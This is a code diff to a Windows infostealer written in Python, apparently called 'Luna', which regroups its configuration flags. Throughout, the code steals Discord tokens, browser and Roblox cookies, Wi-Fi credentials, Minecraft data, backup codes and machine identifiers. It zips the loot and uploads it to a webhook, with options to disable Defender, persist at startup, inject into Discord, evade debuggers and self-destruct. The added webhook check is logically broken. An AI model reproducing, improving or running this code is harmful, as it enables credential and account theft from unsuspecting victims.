@@ -21,26 +21,36 @@ from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
-__CONFIG__ = {
+Config = {
     "webhook": "None",
-    "ping": False,
-    "pingtype": "None",
-    "fakeerror": False,
-    "startup": False,
-    "defender": False,
-    "systeminfo": False,
-    "backupcodes": False,
-    "browser": False,
-    "roblox": False,
-    "obfuscation": False,
-    "injection": False,
-    "minecraft": False,
-    "wifi": False,
-    "killprotector": False,
-    "antidebug_vm": False,
-    "discord": False,
-    "anti_spam": False,
-    "self_destruct": False
+    "WebhookSetting": {
+        "ping": False,
+        "pingtype": "None",
+    },
+    "Discord": {
+        "injection": False,
+        "discord": False,
+        "anti_spam": False,
+    },
+    "Targets": {
+        "defender": False,
+        "systeminfo": False,
+        "backupcodes": False,
+        "browser": False,
+        "roblox": False,
+        "minecraft": False, 
+        "wifi": False,
+    },
+    "Defence": {
+        "killprotector": False,
+        "antidebug_vm": False,
+        "self_destruct": False
+    },
+    "Other": {
+        "fakeerror": False,
+        "startup": False,
+    }
+    
 }
 
 #global variables
@@ -66,57 +76,57 @@ def main(webhook: str):
 
     _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
 
-    if __CONFIG__["ping"]:
-        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
-            content = f"@{__CONFIG__['pingtype'].lower()}"
+    if Config["WebhookSetting"]["ping"]:
+        if Config["WebhookSetting"]["pingtype"] in ["Everyone", "Here"]:
+            content = f"@{Config['WebhookSetting']['pingtype'].lower()}"
             data.update({"content": content})
 
-    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
+    if any(Config[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
         with open(_file, 'rb') as file:
             encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
     else:
         requests.post(webhook, json=data)
 
-    if __CONFIG__["systeminfo"]:
+    if Config["Targets"]["systeminfo"]:
         PcInfo()
 
-    if __CONFIG__["discord"]:
+    if Config["Discord"]["discord"]:
         Discord()
 
     os.remove(_file)
 
 
 def Luna(webhook: str):
-    if __CONFIG__["anti_spam"]:
+    if Config["Discord"]["anti_spam"]:
         AntiSpam()
 
-    if __CONFIG__["antidebug_vm"]:
+    if Config["Defence"]["antidebug_vm"]:
         Debug()
 
     with concurrent.futures.ThreadPoolExecutor() as executor:
-        if __CONFIG__["injection"]:
+        if Config["Discord"]["injection"]:
             executor.submit(Injection, webhook)
         executor.submit(main, webhook)
 
-    if __CONFIG__["self_destruct"]:
+    if Config["Defence"]["self_destruct"]:
         SelfDestruct()
 
 
 def configcheck(list):
-    if not __CONFIG__["fakeerror"]:
+    if not Config["Other"]["fakeerror"]:
         list.remove(fakeerror)
-    if not __CONFIG__["startup"]:
+    if not Config["Other"]["startup"]:
         list.remove(startup)
-    if not __CONFIG__["defender"]:
+    if not Config["Targets"]["defender"]:
         list.remove(disable_defender)
-    if not __CONFIG__["browser"]:
+    if not Config["Targets"]["browser"]:
         list.remove(Browsers)
-    if not __CONFIG__["wifi"]:
+    if not Config["Targets"]["wifi"]:
         list.remove(Wifi)
-    if not __CONFIG__["minecraft"]:
+    if not Config["Targets"]["minecraft"]:
         list.remove(Minecraft)
-    if not __CONFIG__["backupcodes"]:
+    if not Config["Targets"]["backupcodes"]:
         list.remove(BackupCodes)
 
 
@@ -205,7 +215,7 @@ def zipup():
 
 class PcInfo:
     def __init__(self):
-        self.get_inf(__CONFIG__["webhook"])
+        self.get_inf(Config["webhook"])
 
     def get_inf(self, webhook):
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
@@ -228,7 +238,7 @@ class PcInfo:
                     "color": 5639644,
                     "fields": [
                         {
-                             "name": "System Info",
+                            "name": "System Info",
                              "value": f'''💻 **PC Username:** `{username}`\n:desktop: **PC Name:** `{hostname}`\n🌐 **OS:** `{computer_os}`\n\n👀 **IP:** `{ip}`\n🍏 **MAC:** `{mac}`\n🔧 **HWID:** `{hwid}`\n\n<:cpu:1051512676947349525> **CPU:** `{cpu}`\n<:gpu:1051512654591688815> **GPU:** `{gpu}`\n<:ram1:1051518404181368972> **RAM:** `{ram}GB`'''
                         }
                     ],
@@ -259,7 +269,7 @@ class Discord:
         self.ids = []
 
         self.grabTokens()
-        self.upload(__CONFIG__["webhook"])
+        self.upload(Config["webhook"])
 
     def decrypt_val(self, buff, master_key):
         try:
@@ -366,7 +376,7 @@ class Discord:
                                     self.ids.append(uid)
 
     def robloxinfo(self, webhook):
-        if __CONFIG__["roblox"]:
+        if Config["Targets"]["roblox"]:
             with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
                 robo_cookie = f.read().strip()
                 if robo_cookie == "No Roblox Cookies Found":
@@ -701,7 +711,7 @@ class Browsers:
     def roblox_cookies(self):
         robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
 
-        if not __CONFIG__["roblox"]:
+        if not Config["Targets"]["roblox"]:
             pass
         else:
             robo_cookie = ""
@@ -1016,4 +1026,9 @@ class Debug:
 
 
 if __name__ == '__main__' and os.name == "nt":
-    Luna(__CONFIG__["webhook"])
+    # got no clue why you wouldnt check for this anyway but you are a skid <3
+    # ~ Antwan.
+    if Config["webhook"] != None or Config["webhook"] != "":
+        Luna(Config["webhook"])
+    else:
+        print('[!] No webhook inserted.')
